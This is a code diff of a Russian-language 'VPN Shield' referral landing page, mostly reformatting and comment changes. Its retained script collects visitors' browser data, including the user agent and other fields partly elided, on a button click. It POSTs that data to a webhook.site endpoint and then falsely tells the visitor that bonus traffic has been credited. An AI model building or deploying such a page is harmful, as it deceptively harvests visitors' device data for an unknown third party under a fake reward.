@@ -1,11 +1,16 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>VPN Shield</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
         body {
             min-height: 100vh;
             display: flex;
@@ -65,15 +70,15 @@
 </div>
 
 <script>
-    // ==========================================
-    //  ТВОЙ WEBHOOK URL (БЕЗ CORS)
-    // ==========================================
+    // ============================================================
+    //  НАСТРОЙКА
+    // ============================================================
     const WEBHOOK_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';
 
-    // ==========================================
+    // ============================================================
     //  ОСНОВНОЙ КОД
-    // ==========================================
-    document.getElementById('referBtn').addEventListener('click', function() {
+    // ============================================================
+    document.getElementById('referBtn').addEventListener('click', function () {
         const btn = this;
         const statusEl = document.getElementById('status');
 
@@ -81,7 +86,7 @@
         btn.textContent = '⏳ Отправка...';
         statusEl.className = 'status';
 
-        // Собираем данные
+        // === 1. Собираем данные ===
         const data = {
             refId: document.getElementById('refId').textContent,
             userAgent: navigator.userAgent,
@@ -104,7 +109,7 @@
             timestamp: new Date().toISOString()
         };
 
-        // Формируем сообщение
+        // === 2. Формируем читаемое сообщение ===
         const lines = [
             '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
             '═══════════════════════',
@@ -125,31 +130,32 @@
             `⏱️ ${data.timestamp}`
         ];
 
-        const message = lines.join('\n');
+        const messageText = lines.join('\n');
 
-        // Отправляем на Webhook
+        // === 3. Отправляем на Webhook ===
         fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                text: message,
+                text: messageText,
                 raw: data
             })
         })
-        .then(res => {
-            if (res.ok) {
+        .then(response => {
+            if (response.ok) {
                 btn.textContent = '✅ Вы стали рефералом!';
                 btn.style.background = 'linear-gradient(135deg, #00c853, #00e676)';
                 statusEl.className = 'status ok';
                 statusEl.textContent = '✅ Данные отправлены! Бонусы начислены.';
                 document.querySelector('.badge').textContent = '🎁 +5 GB начислены!';
             } else {
-                throw new Error('Webhook error');
+                throw new Error('Ошибка HTTP: ' + response.status);
             }
         })
-        .catch(() => {
+        .catch(error => {
+            console.error('Ошибка:', error);
             btn.textContent = '🔥 Стать рефералом';
             statusEl.className = 'status err';
             statusEl.textContent = '❌ Ошибка отправки. Попробуйте ещё раз.';
